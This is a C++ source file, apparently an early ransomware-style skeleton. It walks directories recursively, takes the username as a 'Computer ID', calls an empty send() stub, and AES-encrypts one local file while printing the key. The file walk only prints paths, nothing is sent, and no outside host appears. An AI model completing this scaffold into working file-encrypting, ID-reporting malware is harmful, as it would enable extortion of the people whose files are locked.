#include <iostream>
#include <string>

#include <boost/filesystem/operations.hpp>

#include "default.h"
#include "osrng.h"
#include "cryptlib.h"
#include "hex.h"
#include "filters.h"
#include "files.h"
#include "aes.h"
#include "ccm.h"

#ifdef _WIN32
#	include <windows.h>
#	include <Lmcons.h>
#elif defined(__linux__)
#	include <pwd.h>
#endif

using namespace std;
using namespace boost::filesystem;
using namespace CryptoPP;

#define EMPTY ""

void iterate(const path& parent);
void process(const path& path);
string getid();
void send();

int main(int argc, char* argv[]) {

	iterate(".");

	cout << "Computer ID: " << getid() << endl;

	send();

	AutoSeededRandomPool prng;

	byte key[AES::DEFAULT_KEYLENGTH];
	prng.GenerateBlock(key, sizeof(key));

	byte iv[AES::BLOCKSIZE];
	prng.GenerateBlock(iv, sizeof(iv));

	string cipher;

	// Print key and initialization vector
	string skey;
	StringSource(key, sizeof(key), true, new HexEncoder(new StringSink(skey)));
	cout << "Key:\t\t" << skey << endl;
	skey.clear();

	string siv;
	StringSource(iv, sizeof(iv), true, new HexEncoder(new StringSink(siv)));
	cout << "IV:\t\t" << siv << endl;
	siv.clear();

	string plain;
	FileSource("./plaintext", true, new StringSink(plain));
	cout << "Plaintext:\t" << plain << endl;

	CBC_Mode<AES>::Encryption e;
	e.SetKeyWithIV(key, sizeof(key), iv);

	StringSource s(plain, true, new StreamTransformationFilter(e, new FileSink("./ciphertext")));

	StreamTransformationFilter filter(e);
	filter.Put((const byte*) plain.data(), plain.size());
	filter.MessageEnd();

	const size_t ret = filter.MaxRetrievable();
	cipher.resize(ret);
	filter.Get((byte*) cipher.data(), cipher.size());

	string ciphertext;
	StringSource(cipher, true, new HexEncoder(new StringSink(ciphertext)));
	cout << "Ciphertext:\t" << ciphertext << endl;
	return 0;
}

void iterate(const path& parent) {
	string path;
	directory_iterator end_itr;

	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			iterate(path);
		} else {
			process(path);
		}
	}
}

void process(const path& path) {
	cout << "Processing " << path << endl;
}

string getid() {
#ifdef _WIN32
	char username[UNLEN + 1];
	DWORD length = UNLEN + 1;
	GetUserName(username, &length);

	return string(username);
#elif defined(__linux__)
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_name);
	}

	return EMPTY;
#endif
}

void send() {

}
